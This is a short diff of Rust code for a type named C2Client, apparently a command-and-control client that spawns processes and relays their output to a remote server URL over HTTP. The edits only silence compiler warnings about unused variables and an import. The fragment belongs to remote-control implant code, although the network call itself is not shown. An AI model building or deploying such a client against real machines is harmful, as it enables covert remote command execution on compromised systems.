@@ -1,5 +1,5 @@
 use std::process::{Command, Stdio};
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader}; // Removed Write
 use std::time::Duration;
 use tokio::time::sleep;
 use reqwest::Client;
@@ -176,12 +176,12 @@ impl C2Client {
                 .spawn()?
         };
 
-        let stdin = child.stdin.take().unwrap();
+        let _stdin = child.stdin.take().unwrap(); // Fix: unused variable
         let stdout = child.stdout.take().unwrap();
-        let stderr = child.stderr.take().unwrap();
+        let _stderr = child.stderr.take().unwrap(); // Fix: unused variable
 
         // 启动输出读取任务
-        let client_id = self.client_id.clone();
+        let _client_id = self.client_id.clone(); // Fix: unused variable
         let server_url = self.server_url.clone();
         let client = self.client.clone();
         
